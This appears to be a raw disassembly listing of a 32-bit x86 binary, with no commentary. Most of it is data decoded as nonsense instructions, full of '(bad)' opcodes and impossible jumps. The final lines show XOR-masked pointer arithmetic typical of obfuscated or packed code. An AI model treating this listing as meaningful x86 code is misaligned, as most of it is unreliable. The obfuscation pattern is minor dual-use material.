  418a4f:	(bad)  
  418a50:	mov    bh,0xdd
  418a52:	push   0x5bf8d2eb
  418a57:	sub    al,BYTE PTR [esi-0x62]
  418a5a:	ja     0x4189ea
  418a5c:	or     DWORD PTR [ebp+0x21],eax
  418a5f:	cmp    esi,DWORD PTR [edi]
  418a61:	push   cs
  418a62:	add    DWORD PTR [edx+edi*4],esi
  418a65:	sbb    DWORD PTR [eax-0x4090ec86],0xcb08da4f
  418a6f:	add    dl,ch
  418a71:	lods   eax,DWORD PTR ds:[esi]
  418a72:	or     eax,0x6a923fd4
  418a77:	daa    
  418a78:	sbb    ebx,DWORD PTR [esp+eiz*8+0x50]
  418a7c:	lahf   
  418a7d:	inc    edx
  418a7e:	test   cl,dh
  418a80:	mov    ebp,0x283f876
  418a85:	leave  
  418a86:	rcr    ebp,1
  418a88:	mov    ds:0xc948906f,eax
  418a8d:	jb     0x418aee
  418a8f:	cmc    
  418a90:	jl     0x418a33
  418a92:	mov    eax,ds:0x41c4a4ea
  418a97:	pop    es
  418a98:	jae    0x418a3a
  418a9a:	bound  edi,QWORD PTR [edx]
  418a9c:	cwde   
  418a9d:	neg    BYTE PTR [edx+0x5c]
  418aa0:	sub    bh,dh
  418aa2:	imul   edx,DWORD PTR [edi],0xad34b8c2
  418aa8:	out    0x94,al
  418aaa:	(bad)  [esi+edx*8-0x2e]
  418aae:	das    
  418aaf:	mov    ah,ch
  418ab1:	jo     0x418a6a
  418ab3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418ab4:	mov    eax,0x2fa439f9
  418ab9:	and    bl,bl
  418abb:	sbb    esp,DWORD PTR [edi+0xd243d7d]
  418ac1:	in     al,dx
  418ac2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ac3:	ja     0x418ac2
  418ac5:	pop    ds
  418ac6:	aad    0x95
  418ac8:	cli    
  418ac9:	es in  eax,dx
  418acb:	test   eax,0xebfe9903
  418ad0:	es leave 
  418ad2:	rcl    DWORD PTR [ebp+0x71],cl
  418ad5:	in     eax,0xbd
  418ad7:	mov    cl,0xbd
  418ad9:	arpl   WORD PTR [edx-0x4c],bp
  418adc:	mov    bh,0xbf
  418ade:	dec    ebx
  418adf:	mov    edi,0xebe3b187
  418ae4:	xor    edx,DWORD PTR [eax]
  418ae6:	in     eax,dx
  418ae7:	ror    DWORD PTR [edx-0x74051438],1
  418aed:	in     al,dx
  418aee:	icebp  
  418aef:	loopne 0x418aa0
  418af1:	dec    ebp
  418af2:	imul   esp,ecx,0x6b
  418af5:	fwait
  418af6:	cdq    
  418af7:	fldlg2 
  418af9:	hlt    
  418afa:	cmp    BYTE PTR ds:0xc09f931d,bh
  418b00:	xor    esi,DWORD PTR [edi]
  418b02:	sub    al,0x9c
  418b04:	sbb    al,0xaf
  418b06:	repz sbb DWORD PTR [edx+0x5367c774],ebx
  418b0d:	cmp    dl,al
  418b0f:	jecxz  0x418ad9
  418b11:	repnz push esi
  418b13:	in     al,0x7c
  418b15:	sub    BYTE PTR [eax],bl
  418b17:	jmp    0x418b2f
  418b19:	loop   0x418ae6
  418b1b:	mov    edi,0xfbdbdfe1
  418b20:	outs   dx,DWORD PTR ds:[esi]
  418b21:	add    DWORD PTR [edi],ecx
  418b23:	sbb    eax,0x9e01b040
  418b28:	or     DWORD PTR [edx+0x7c],edx
  418b2b:	call   0x2b29b223
  418b30:	lea    ecx,[edi+0x4f218707]
  418b36:	(bad)  
  418b37:	pop    eax
  418b38:	sub    eax,0xf47ecef6
  418b3d:	inc    edi
  418b3e:	(bad)  
  418b3f:	in     al,dx
  418b40:	test   eax,0x6829e7e0
  418b45:	mov    edi,0x53d921de
  418b4a:	adc    eax,DWORD PTR [ebx-0x1d6ac340]
  418b50:	mov    BYTE PTR [ecx+0x13],0xec
  418b54:	sub    BYTE PTR [ecx+0x1],ah
  418b57:	(bad)  [eax+0x19]
  418b5a:	mov    ebp,0xab9577a
  418b5f:	mov    eax,0xe07efcd
  418b64:	neg    BYTE PTR [eax+edx*1+0x6c]
  418b68:	test   eax,0xe9820ffe
  418b6d:	repz jbe 0x418bb4
  418b70:	mov    eax,0x778c72a0
  418b75:	out    dx,eax
  418b76:	(bad)  
  418b78:	and    DWORD PTR [ecx],0xf6fab1be
  418b7e:	mov    cl,0xf0
  418b80:	sbb    al,0xf7
  418b82:	xchg   ebx,eax
  418b83:	mov    esi,0xc39c5c8f
  418b88:	(bad)  
  418b89:	sbb    eax,0xd00e4f66
  418b8e:	mov    gs,WORD PTR [edx]
  418b90:	push   edx
  418b91:	cli    
  418b92:	mov    esp,0x7af8ba48
  418b97:	xchg   si,ax
  418b99:	jg     0x418b94
  418b9b:	mov    es,WORD PTR [ebx]
  418b9d:	jae    0x418be7
  418b9f:	cwde   
  418ba0:	and    BYTE PTR [ecx-0x28a04e1b],ch
  418ba6:	xor    edi,eax
  418ba8:	inc    ecx
  418ba9:	scas   eax,DWORD PTR es:[edi]
  418baa:	sbb    ah,BYTE PTR [eax-0x12]
  418bad:	rep ins DWORD PTR es:[edi],dx
  418baf:	inc    ecx
  418bb0:	(bad)  
  418bb1:	adc    ah,BYTE PTR [edx]
  418bb3:	pusha  
  418bb4:	mov    ebp,0x941d09ae
  418bb9:	sbb    eax,0xb99c98cd
  418bbe:	les    esi,FWORD PTR [edi+0x1cf268ed]
  418bc4:	aad    0xaf
  418bc6:	imul   ebp,DWORD PTR [ecx],0x101d2106
  418bcc:	popf   
  418bcd:	mov    bl,BYTE PTR [eax-0x3f]
  418bd0:	outs   dx,DWORD PTR ds:[esi]
  418bd1:	jne    0x418b88
  418bd3:	cmc    
  418bd4:	adc    cl,BYTE PTR [edi+0x1d5da286]
  418bda:	adc    BYTE PTR [edx-0xd],0xa1
  418bde:	popa   
  418bdf:	mov    cl,0x71
  418be1:	xchg   ebx,eax
  418be2:	in     eax,0xb2
  418be4:	sahf   
  418be5:	ins    BYTE PTR es:[edi],dx
  418be6:	add    bh,BYTE PTR [edx-0x43]
  418be9:	mov    esp,0x8f8a4457
  418bee:	arpl   WORD PTR ds:0x92542e95,sp
  418bf4:	xor    DWORD PTR [edx],0x41
  418bf7:	mov    bl,0x35
  418bf9:	out    dx,eax
  418bfa:	(bad)  
  418bfb:	push   0x56
  418bfd:	je     0x418b9d
  418bff:	test   al,ch
  418c01:	out    dx,al
  418c02:	es and eax,0x89c25c9e
  418c08:	jmp    0xdfc9:0xd3d3
  418c0e:	out    0x50,eax
  418c10:	pushf  
  418c11:	or     bl,BYTE PTR [ecx+esi*1]
  418c14:	inc    ecx
  418c15:	fidiv  WORD PTR [ebx+0x23]
  418c18:	in     eax,0x84
  418c1a:	push   esp
  418c1b:	pop    ss
  418c1c:	div    DWORD PTR [ebx+0x2b49b2bc]
  418c22:	mov    ds,WORD PTR [ebx]
  418c24:	fisub  DWORD PTR [ebp+0x4c]
  418c27:	sub    BYTE PTR [ebp-0x5f],al
  418c2a:	bnd ja 0x418c2f
  418c2d:	mov    esp,DWORD PTR [esi+0x3b]
  418c30:	imul   esi,DWORD PTR [eax-0x6fdcac07],0xffffff8d
  418c37:	out    0x7f,eax
  418c39:	(bad)
  418c3d:	rcl    BYTE PTR [ecx-0x1a],1
  418c40:	xchg   edx,eax
  418c41:	mov    ah,0x61
  418c43:	sub    al,0xf2
  418c45:	ja     0x418ca8
  418c47:	lock inc ebx
  418c49:	hlt    
  418c4a:	(bad)  
  418c4b:	pop    ss
  418c4c:	jmp    0xa1f7b60b
  418c51:	pusha  
  418c52:	stc    
  418c53:	inc    esp
  418c54:	cwde   
  418c55:	lahf   
  418c56:	cmp    esp,DWORD PTR [esi]
  418c58:	mov    ah,0xa4
  418c5a:	call   0x3140d6ed
  418c5f:	xor    esp,esp
  418c61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418c62:	cmc    
  418c63:	push   ebx
  418c64:	sub    dl,BYTE PTR [esi-0x12]
  418c67:	sbb    esi,DWORD PTR [ebp+0x1f]
  418c6a:	dec    ebx
  418c6b:	imul   esi,ebx,0xffffffef
  418c6e:	(bad)  
  418c6f:	sahf   
  418c70:	enter  0x1f3b,0x4b
  418c74:	call   0x470f5689
  418c79:	popf   
  418c7a:	ret    
  418c7b:	sub    al,0xa8
  418c7d:	xor    dh,0xc4
  418c80:	lahf   
  418c81:	adc    esp,ebx
  418c83:	xor    bh,BYTE PTR ds:0x11d1b7e3
  418c89:	mov    ebp,0x7de11d72
  418c8e:	leave  
  418c8f:	(bad)  
  418c90:	xlat   BYTE PTR ds:[ebx]
  418c91:	jno    0x418cf9
  418c93:	and    eax,0xb5bde8fd
  418c98:	xor    DWORD PTR [ebx+0xeeec48],ebx
  418c9e:	jle    0x418cdf
  418ca0:	mov    BYTE PTR [esi-0x4e],bh
  418ca3:	(bad)  
  418ca4:	xchg   edi,eax
  418ca5:	xchg   edx,eax
  418ca6:	inc    edi
  418ca7:	mov    ebp,0xdac2ee3f
  418cac:	mov    eax,ds:0x81adec7f
  418cb1:	addr16 (bad) 
  418cb3:	jmp    0x418c65
  418cb5:	in     eax,0x68
  418cb7:	sti    
  418cb8:	ret    
  418cb9:	sbb    dl,dl
  418cbb:	adc    ecx,esi
  418cbd:	leave  
  418cbe:	dec    ebp
  418cbf:	out    0x4,al
  418cc1:	ror    BYTE PTR [edi-0x5c],0x6b
  418cc5:	mov    cl,0xd3
  418cc7:	ja     0x418d17
  418cc9:	inc    edx
  418cca:	xchg   edi,eax
  418ccb:	xor    eax,0x4b4bbae6
  418cd0:	sbb    BYTE PTR [edi],al
  418cd2:	fisubr DWORD PTR [edx]
  418cd4:	jnp    0x418cc9
  418cd6:	inc    edx
  418cd7:	mov    eax,0xd1a44e0b
  418cdc:	cmp    ch,BYTE PTR [ecx-0x40]
  418cdf:	test   al,0x7d
  418ce1:	push   ds
  418ce2:	mov    edx,0x1501ff32
  418ce7:	enter  0x2c75,0xd2
  418ceb:	inc    ecx
  418cec:	jl     0x418cb7
  418cee:	out    dx,al
  418cef:	loopne 0x418c9f
  418cf1:	mov    esp,0x6b848737
  418cf6:	adc    al,0x6e
  418cf8:	ret    0xe720
  418cfb:	sti    
  418cfc:	pop    ds
  418cfd:	mov    ch,0xc5
  418cff:	mov    WORD PTR [edx+0x29],fs
  418d02:	push   eax
  418d03:	ins    BYTE PTR es:[edi],dx
  418d04:	std    
  418d05:	std    
  418d06:	stos   BYTE PTR es:[edi],al
  418d07:	imul   ebp,DWORD PTR [edx+0x2],0x8a9ade37
  418d0e:	and    eax,0x3bb1b757
  418d13:	cmp    DWORD PTR [eax+0x4b],ebx
  418d16:	jb     0x418d46
  418d18:	test   bl,bl
  418d1a:	std    
  418d1b:	test   BYTE PTR [edi+0x3a],cl
  418d1e:	adc    BYTE PTR [edx],ch
  418d20:	adc    eax,0xfc7460a6
  418d25:	or     BYTE PTR [edi],cl
  418d27:	adc    DWORD PTR [edi-0x5dd035ab],edx
  418d2d:	bound  ebp,QWORD PTR [eax+ebp*1-0x4e0e1980]
  418d34:	pop    edi
  418d35:	fcomp  QWORD PTR [esp+edi*1]
  418d38:	pop    eax
  418d39:	mov    ebp,0x4640fa66
  418d3e:	jecxz  0x418cef
  418d40:	xchg   al,dl
  418d42:	mov    ss,WORD PTR [eax]
  418d44:	shl    BYTE PTR [ebx+0x5],0x35
  418d48:	lock es mov cl,al
  418d4c:	aad    0xec
  418d4e:	lahf   
  418d4f:	aas    
  418d50:	retf   
  418d51:	mov    dh,0xa6
  418d53:	xor    eax,0xe90d53fa
  418d58:	lea    ebp,[esi+0x4697dc1f]
  418d5e:	test   BYTE PTR [esi],al
  418d60:	xor    BYTE PTR [eax+edi*2],bh
  418d63:	hlt    
  418d64:	xor    BYTE PTR [edi],dl
  418d66:	shl    BYTE PTR [edx-0x3a4e7e75],0xa9
  418d6d:	sahf   
  418d6e:	jg     0x418da1
  418d70:	retf   
  418d71:	ficom  DWORD PTR [ecx+0x5a]
  418d74:	mov    WORD PTR [ebx+0x7c28b618],ds
  418d7a:	repnz dec ebx
  418d7c:	call   0x8a19:0xf5559df1
  418d83:	and    eax,0xb332c49
  418d88:	mov    ah,ch
  418d8a:	aaa    
  418d8b:	push   0x71eabe2f
  418d90:	scas   al,BYTE PTR es:[edi]
  418d91:	lea    edi,[edx-0x15558c09]
  418d97:	fldenv fs:[edi*8-0xe7161e5]
  418d9f:	lock les edx,FWORD PTR [ebx+0x3f472758]
  418da6:	enter  0x6d39,0xcc
  418daa:	mov    edi,0xa0ed44cf
  418daf:	aad    0x93
  418db1:	pop    ecx
  418db2:	xchg   cl,al
  418db4:	imul   edx,eax,0x27b88e38
  418dba:	jne    0x418d6c
  418dbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418dbd:	and    DWORD PTR [edi+0x242abcdd],edx
  418dc3:	in     eax,0x31
  418dc5:	mov    ch,0x7f
  418dc7:	push   ebx
  418dc8:	mov    ecx,0x3ec619b4
  418dcd:	and    ax,0xdef0
  418dd1:	sbb    BYTE PTR [esi-0xd0a1be5],bh
  418dd7:	pop    edi
  418dd8:	jle    0x418de6
  418dda:	sbb    DWORD PTR [ebx+0x5],edi
  418ddd:	rcl    ebp,cl
  418ddf:	xchg   ebp,eax
  418de0:	and    al,0xa5
  418de2:	outs   dx,DWORD PTR ds:[esi]
  418de3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418de4:	ins    DWORD PTR es:[edi],dx
  418de5:	imul   edx,DWORD PTR [ecx-0x70],0xa64ae564
  418dec:	inc    esi
  418ded:	lea    ebx,[edx]
  418def:	sti    
  418df0:	cmp    eax,0x33f48f94
  418df5:	leave  
  418df6:	jo     0x418d84
  418df8:	xor    al,0xcf
  418dfa:	jecxz  0x418e49
  418dfc:	cmp    al,0x4a
  418dfe:	ficomp DWORD PTR [edx+0x74919f9c]
  418e04:	nop
  418e05:	repnz xchg ebp,eax
  418e07:	fild   DWORD PTR [ecx-0x16]
  418e0a:	cli    
  418e0b:	scas   eax,DWORD PTR es:[edi]
  418e0c:	ret    
  418e0d:	adc    DWORD PTR [edi+0x68],edi
  418e10:	mov    ah,0xa7
  418e12:	push   esp
  418e13:	ds pop es
  418e15:	xchg   edx,eax
  418e16:	sbb    eax,DWORD PTR [ecx+eax*1+0x7f6eb564]
  418e1d:	xor    BYTE PTR [edx+edx*8-0x54d856d1],bh
  418e24:	dec    esp
  418e25:	jbe    0x418e40
  418e27:	aaa    
  418e28:	cld    
  418e29:	jl     0x418e36
  418e2b:	cwde   
  418e2c:	cs push es
  418e2e:	sbb    DWORD PTR [ebx],esi
  418e30:	push   ss
  418e31:	jo     0x418ea2
  418e33:	push   ebx
  418e34:	mov    bh,0xbd
  418e36:	scas   al,BYTE PTR es:[edi]
  418e37:	test   BYTE PTR [esi],0xe9
  418e3a:	and    eax,0xd94ac834
  418e3f:	fucomi st,st(4)
  418e41:	cdq    
  418e42:	dec    ebx
  418e43:	mov    ch,0x9e
  418e45:	mov    bl,0x27
  418e47:	(bad)  
  418e48:	enter  0x43cc,0xc9
  418e4c:	jp     0x418e93
  418e4e:	test   eax,0x6c04b8bc
  418e53:	icebp  
  418e54:	push   ds
  418e55:	cmp    bl,BYTE PTR [edi]
  418e57:	stos   BYTE PTR es:[edi],al
  418e58:	call   0x16803d13
  418e5d:	(bad)  
  418e5e:	sar    al,1
  418e60:	xchg   BYTE PTR [ebp+0x3f87984f],cl
  418e66:	pop    esi
  418e67:	inc    esi
  418e68:	adc    dh,BYTE PTR [edx+0x60b328c7]
  418e6e:	dec    ebp
  418e6f:	or     BYTE PTR [edx+0x5d173696],ch
  418e75:	aas    
  418e76:	xor    bh,BYTE PTR [edi+0x41]
  418e79:	nop
  418e7a:	jp     0x418ed2
  418e7c:	cmp    edx,DWORD PTR [ebx]
  418e7e:	xor    al,0x8a
  418e80:	jb     0x418ed8
  418e82:	test   eax,0x226617d8
  418e87:	or     edi,DWORD PTR [edi]
  418e89:	or     al,0x1b
  418e8b:	sub    ah,BYTE PTR es:[edi+0x1c]
  418e8f:	mov    ?,WORD PTR [edi-0x4f]
  418e92:	outs   dx,DWORD PTR ds:[esi]
  418e93:	or     cl,BYTE PTR [esi]
  418e95:	add    eax,0xb860d680
  418e9a:	mov    dl,0x37
  418e9c:	rol    DWORD PTR [esi-0x3de17c60],1
  418ea2:	dec    ebx
  418ea3:	aaa    
  418ea4:	pop    edx
  418ea5:	aad    0x71
  418ea7:	pop    ss
  418ea8:	push   ds
  418ea9:	jmp    0x15c6:0xb42f50f5
  418eb0:	jns    0x418e53
  418eb2:	and    BYTE PTR [ecx+ecx*8-0x47],bl
  418eb6:	dec    edx
  418eb7:	add    bh,BYTE PTR [edi+0x63]
  418eba:	adc    eax,0xf7194ed3
  418ebf:	push   ebx
  418ec0:	mov    ch,0x95
  418ec2:	xchg   esp,eax
  418ec3:	xchg   edi,eax
  418ec4:	jne    0x418e5b
  418ec6:	in     al,0x8e
  418ec8:	aad    0x89
  418eca:	pop    es
  418ecb:	mov    esp,0x90778625
  418ed0:	mov    ch,0xfe
  418ed2:	sbb    eax,0xf9a45f92
  418ed7:	out    0x4f,eax
  418ed9:	call   0x7cfa:0x3b6a96d8
  418ee0:	push   esp
  418ee1:	ja     0x418f55
  418ee3:	pop    edi
  418ee4:	mov    DWORD PTR cs:[eax+0x51],0xbe2d4b44
  418eec:	hlt    
  418eed:	adc    ebp,DWORD PTR [edx+0x43]
  418ef0:	cli    
  418ef1:	scas   eax,DWORD PTR es:[edi]
  418ef2:	jo     0x418e8e
  418ef4:	pop    edi
  418ef5:	imul   ebx,DWORD PTR [edx],0xb6bd4288
  418efb:	inc    ebx
  418efc:	mov    ch,0x5f
  418efe:	cwde   
  418eff:	mov    esi,0x49f2bc3b
  418f04:	ror    DWORD PTR [edi+eiz*1+0x7b],cl
  418f08:	add    BYTE PTR [edi+0xb],bh
  418f0b:	mov    esi,0x3431d8f1
  418f10:	stos   BYTE PTR es:[edi],al
  418f11:	jmp    0xb2c822db
  418f16:	dec    edi
  418f17:	pop    esi
  418f18:	retf   0xa13e
  418f1b:	dec    ebp
  418f1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f1d:	ret    0xc83d
  418f20:	cdq    
  418f21:	jp     0x418ecb
  418f23:	push   eax
  418f24:	xchg   ecx,ebp
  418f26:	aad    0x48
  418f28:	dec    ebp
  418f29:	xor    ecx,DWORD PTR [ecx]
  418f2b:	je     0x418f68
  418f2d:	and    DWORD PTR [esi-0x63],ecx
  418f30:	jae    0x418ed1
  418f32:	cmp    cl,BYTE PTR [edx]
  418f34:	out    dx,al
  418f35:	mov    al,ds:0x960bcbe
  418f3a:	test   BYTE PTR [esi],ch
  418f3c:	mov    BYTE PTR [ecx-0x51],cl
  418f3f:	lahf   
  418f40:	inc    edi
  418f41:	rcl    BYTE PTR [edi+0x6b],cl
  418f44:	hlt    
  418f45:	xchg   esi,eax
  418f46:	cdq    
  418f47:	clc    
  418f48:	fidivr DWORD PTR [eax-0x42]
  418f4b:	inc    edi
  418f4c:	cwde   
  418f4d:	or     eax,0x66e697a
  418f52:	mov    bl,0x68
  418f54:	jmp    0xb3f3:0xcca1cd67
  418f5b:	retf   
  418f5c:	xchg   edx,eax
  418f5d:	xor    ah,dl
  418f5f:	jg     0x418f24
  418f61:	in     eax,dx
  418f62:	repz inc esi
  418f64:	lahf   
  418f65:	cmp    DWORD PTR [ecx-0x6005f4d],ebx
  418f6b:	aam    0xa3
  418f6d:	data16 or al,dl
  418f70:	pop    es
  418f71:	jmp    FWORD PTR [esi+eiz*8-0x3ae55ff5]
  418f78:	retf   0xcbde
  418f7b:	xlat   BYTE PTR ds:[ebx]
  418f7c:	or     BYTE PTR [ecx],bl
  418f7e:	test   eax,0xaff039b8
  418f83:	es jecxz 0x418f7c
  418f86:	push   esi
  418f87:	outs   dx,BYTE PTR ds:[esi]
  418f88:	gs sbb eax,0x1dd859c0
  418f8e:	call   0xdef:0x5cb9d7d5
  418f95:	pop    ecx
  418f96:	leave  
  418f97:	push   0x378b6e3b
  418f9c:	push   0xffffffab
  418f9e:	dec    ebp
  418f9f:	pop    esp
  418fa0:	pop    ebp
  418fa1:	int3   
  418fa2:	cmp    al,0x40
  418fa4:	out    dx,al
  418fa5:	pop    es
  418fa6:	push   ss
  418fa7:	loopne 0x418f31
  418fa9:	clc    
  418faa:	mov    ebp,ecx
  418fac:	cmp    eax,0x5e8fb345
  418fb1:	in     eax,dx
  418fb2:	pop    ds
  418fb3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418fb4:	or     DWORD PTR [edx],edx
  418fb6:	(bad)  [esi-0x3a7a15d4]
  418fbc:	test   eax,0x48093b00
  418fc1:	and    bh,dh
  418fc3:	lds    esp,FWORD PTR [ecx]
  418fc5:	addr16 ss (bad) 
  418fc8:	push   eax
  418fc9:	or     eax,0x74e54b1c
  418fce:	mov    ah,0x40
  418fd0:	adc    ecx,ecx
  418fd2:	add    ebp,eax
  418fd4:	jne    0x419025
  418fd6:	dec    esi
  418fd7:	in     eax,0xf0
  418fd9:	pop    edi
  418fda:	mov    ah,0x34
  418fdc:	mov    ebp,0xb3759a37
  418fe1:	shr    DWORD PTR [edi-0x4],1
  418fe4:	mov    ebp,0x29cd43c6
  418fe9:	or     DWORD PTR [eax],ecx
  418feb:	lahf   
  418fec:	fs ret 0x49c8
  418ff0:	jmp    0x1acb0c93
  418ff5:	out    0xb2,al
  418ff7:	cli    
  418ff8:	aad    0x62
  418ffa:	icebp  
  418ffb:	in     eax,dx
  418ffc:	adc    ebp,DWORD PTR [eax-0x39]
  418fff:	mov    cl,0x2b
  419001:	aad    0xed
  419003:	test   ecx,0x3bf05f28
  419009:	aas    
  41900a:	pushf  
  41900b:	push   ds
  41900c:	pop    esi
  41900d:	adc    BYTE PTR [esi-0x3068e6c0],0xc
  419014:	nop
  419015:	pop    esi
  419016:	add    cl,bh
  419018:	neg    DWORD PTR [esp+ebx*1]
  41901b:	aaa    
  41901c:	xor    DWORD PTR [ebx+0xc1fc509],eax
  419022:	xlat   BYTE PTR ds:[bx]
  419024:	(bad)  
  419025:	push   0x7d
  419027:	cwde   
  419028:	ror    BYTE PTR [edx-0x5b],0xe3
  41902c:	pop    ds
  41902d:	ss daa 
  41902f:	sbb    BYTE PTR [ebx-0x3e],dl
  419032:	ins    DWORD PTR es:[edi],dx
  419033:	(bad)  
  419034:	test   DWORD PTR [edi-0x2a],0xd3b2335f
  41903b:	les    ebx,FWORD PTR [esi+edx*2-0x2d]
  41903f:	push   edi
  419040:	jno    0x4190a0
  419042:	jg     0x419030
  419044:	dec    ebx
  419045:	inc    esi
  419046:	push   ebx
  419047:	or     eax,0xc8af2d93
  41904c:	pop    ss
  41904d:	ja     0x41908f
  41904f:	jbe    0x41908f
  419051:	out    dx,al
  419052:	mov    dl,0x9b
  419054:	add    DWORD PTR [ebx+0x27abcb54],ecx
  41905a:	fwait
  41905b:	inc    eax
  41905c:	aad    0x4c
  41905e:	je     0x41900b
  419060:	xor    BYTE PTR [eax+esi*2],al
  419063:	stc    
  419064:	jae    0x4190ce
  419066:	sub    BYTE PTR [eax],bl
  419068:	loop   0x419003
  41906a:	nop
  41906b:	test   DWORD PTR [ebp+0xa8653ed],0x8e75a926
  419075:	jns    0x419064
  419077:	add    ecx,ebx
  419079:	lahf   
  41907a:	jge    0x41904c
  41907c:	mov    ecx,0x63792e5c
  419081:	rol    DWORD PTR [esi],cl
  419083:	pusha  
  419084:	loopne 0x419044
  419086:	cwde   
  419087:	cwde   
  419088:	ins    BYTE PTR es:[edi],dx
  419089:	xor    ebx,DWORD PTR [eax]
  41908b:	mov    al,ds:0x2fa50265
  419090:	test   BYTE PTR [eax*1+0x7ca90599],ch
  419097:	inc    esp
  419098:	and    al,0x5
  41909a:	test   BYTE PTR [eax+edi*8-0x44c67dee],al
  4190a1:	add    DWORD PTR [ecx],0xffffffee
  4190a4:	mov    ah,0xe1
  4190a6:	xchg   ebp,eax
  4190a7:	fwait
  4190a8:	cmp    ebx,DWORD PTR [ecx]
  4190aa:	push   ebx
  4190ab:	mov    al,ds:0x9abc0b66
  4190b0:	scas   eax,DWORD PTR es:[edi]
  4190b1:	outs   dx,BYTE PTR ds:[esi]
  4190b2:	inc    ecx
  4190b3:	jp     0x4190c7
  4190b5:	sti    
  4190b6:	mov    ebx,DWORD PTR [ebp+0x5c]
  4190b9:	inc    eax
  4190ba:	jle    0x4190cc
  4190bc:	ds sbb ebx,ecx
  4190bf:	daa    
  4190c0:	sbb    eax,0x975283dd
  4190c5:	int    0x6e
  4190c7:	pop    ecx
  4190c8:	mov    WORD PTR [ecx+0x6db1644b],cs
  4190ce:	xor    al,0xa0
  4190d0:	mov    ss,WORD PTR [edi+0x3cf286ce]
  4190d6:	arpl   WORD PTR [edx-0x364972d7],dx
  4190dc:	pop    ss
  4190dd:	inc    esi
  4190de:	dec    ecx
  4190df:	js     0x4190f6
  4190e1:	popa   
  4190e2:	lahf   
  4190e3:	add    al,0x33
  4190e5:	dec    ecx
  4190e6:	mov    al,dh
  4190e8:	dec    eax
  4190e9:	data16 or al,0x95
  4190ec:	xor    edi,DWORD PTR [eax+edx*2]
  4190ef:	ror    bl,cl
  4190f1:	scas   eax,DWORD PTR es:[edi]
  4190f2:	cld    
  4190f3:	jae    0x41913d
  4190f5:	sub    ebx,DWORD PTR [esi]
  4190f7:	test   al,0xa7
  4190f9:	sbb    al,0x73
  4190fb:	ret    
  4190fc:	or     BYTE PTR [ebp+esi*2-0x14621090],bh
  419103:	mov    al,es:0x83fc8d93
  419109:	mov    cl,0x16
  41910b:	inc    edx
  41910c:	adc    dh,ah
  41910e:	add    al,0x84
  419110:	and    BYTE PTR ds:0x2d2083c1,dh
  419116:	inc    esi
  419117:	push   edi
  419118:	in     al,0x1d
  41911a:	mov    ch,0x16
  41911c:	addr16 dec edx
  41911e:	lock rcl DWORD PTR [ecx+0x4dce877f],1
  419125:	inc    esp
  419126:	sti    
  419127:	xor    eax,0x5a7692db
  41912c:	xor    al,0x35
  41912e:	push   edx
  41912f:	enter  0x5c34,0xbf
  419133:	in     al,dx
  419134:	sbb    bh,bl
  419136:	pushf  
  419137:	cmp    al,0xec
  419139:	sbb    BYTE PTR fs:[ebx],ah
  41913c:	test   eax,0x53185b02
  419142:	test   BYTE PTR [edi-0xd],ch
  419145:	pop    edx
  419146:	js     0x419106
  419148:	fisttp QWORD PTR [esi]
  41914a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41914b:	pop    ebx
  41914c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41914d:	loope  0x419136
  41914f:	mov    cs,WORD PTR [edx+edi*4-0x77]
  419153:	cmp    dx,0xa0c6
  419158:	imul   eax,esi,0x74
  41915b:	xchg   esi,eax
  41915c:	and    ecx,DWORD PTR [edx-0x40]
  41915f:	div    DWORD PTR [esi]
  419161:	(bad)  
  419162:	pusha  
  419163:	cmp    ah,0x7
  419166:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419167:	add    ah,BYTE PTR [eax]
  419169:	sub    eax,0x95b30193
  41916e:	mov    ch,0xc4
  419170:	mov    cs,WORD PTR [ecx+edx*1-0x57e09a5c]
  419177:	sahf   
  419178:	sub    BYTE PTR [esi+0x1763e291],bh
  41917e:	xor    al,0x22
  419180:	mov    ds:0xfefee686,al
  419185:	shl    al,cl
  419187:	aam    0xc5
  419189:	int3   
  41918a:	push   0x93473f2b
  41918f:	jg     0x4191fb
  419191:	das    
  419192:	ins    DWORD PTR es:[edi],dx
  419193:	inc    edx
  419194:	shr    esi,1
  419196:	test   al,0x6d
  419198:	int    0x5c
  41919a:	test   al,0xcf
  41919c:	loopne 0x4191a1
  41919e:	sbb    DWORD PTR [eax-0x72],ebx
  4191a1:	dec    edx
  4191a2:	int    0x4e
  4191a4:	dec    ebp
  4191a5:	mov    eax,ds:0x9d7097e1
  4191aa:	jb     0x419194
  4191ac:	hlt    
  4191ad:	out    0x54,al
  4191af:	mov    al,ds:0xb2f0f6d5
  4191b4:	sbb    DWORD PTR [ecx-0x7e93e98c],esp
  4191ba:	fisttp DWORD PTR [ebx+0x558be845]
  4191c0:	lock xor eax,esi
  4191c3:	lea    eax,[eax+edx*1+0x3272db]
  4191ca:	mov    DWORD PTR [ebp-0x10],eax
  4191cd:	jmp    0x40deb0
  4191d2:	mov    eax,DWORD PTR [ebp-0x34]
  4191d5:	mov    edx,DWORD PTR [ebp+0xc]
  4191d8:	xor    edx,esi
  4191da:	lea    ecx,[ecx+edx*1+0x3272db]
  4191e1:	lea    edx,[ecx-0x3272db]
  4191e7:	xor    edx,esi
  4191e9:	cmp    edx,0xf89c95b6
  4191ef:	jne    0x40dd2f
  4191f5:	mov    ecx,DWORD PTR [ebp+0x8]
  4191f8:	mov    edx,DWORD PTR [ebp+0xc]
  4191fb:	mov    ebx,DWORD PTR [ebp+0x8]
  4191fe:	xor    edx,esi
  419200:	mov    dl,BYTE PTR [edx+eax*1+0x3272db]
  419207:	xor    ecx,esi
  419209:	mov    cl,BYTE PTR [ecx+eax*1+0x3272db]
  419210:	xor    ebx,esi
  419212:	mov    BYTE PTR [ebx+eax*1+0x3272db],dl
  419219:	mov    edx,DWORD PTR [ebp+0xc]
  41921c:	xor    edx,esi
  41921e:	mov    BYTE PTR [edx+eax*1+0x3272db],cl
  419225:	mov    eax,DWORD PTR [ebp+0xc]
  419228:	xor    eax,esi
  41922a:	add    eax,edi
  41922c:	pop    edi
  41922d:	pop    esi
  41922e:	pop    ebx
  41922f:	leave  
  419230:	ret    0x8
  419233:	push   ebp
  419234:	mov    ebp,esp
